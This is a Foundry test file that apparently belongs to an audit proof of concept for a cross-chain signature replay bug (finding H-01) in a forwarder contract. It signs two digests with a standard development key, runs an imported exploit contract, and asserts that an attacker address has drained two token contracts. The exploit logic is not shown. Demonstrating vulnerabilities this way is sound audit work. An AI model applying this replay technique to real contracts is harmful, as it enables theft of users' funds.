// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./56703-h-01-cross-chain-signature-replay-attack-due-to-user-supplie.sol";

contract NextGenForwarderReplayTest is Test {
    uint256 constant USER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    function test_exploit() public {
        Exploit e = new Exploit();
        assertEq(vm.addr(USER_PK), e.USER(), "key matches USER");

        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(USER_PK, e.digestFor(address(e.eurfA()), 0));
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(USER_PK, e.digestFor(address(e.eurfB()), 0));
        e.setDualSig(abi.encodePacked(rA, sA, vA), abi.encodePacked(rB, sB, vB));

        e.run();

        assertEq(e.eurfA().balanceOf(e.ATTACKER()), e.AMOUNT(), "A drained");
        assertEq(e.eurfB().balanceOf(e.ATTACKER()), e.AMOUNT(), "B drained");
    }
}
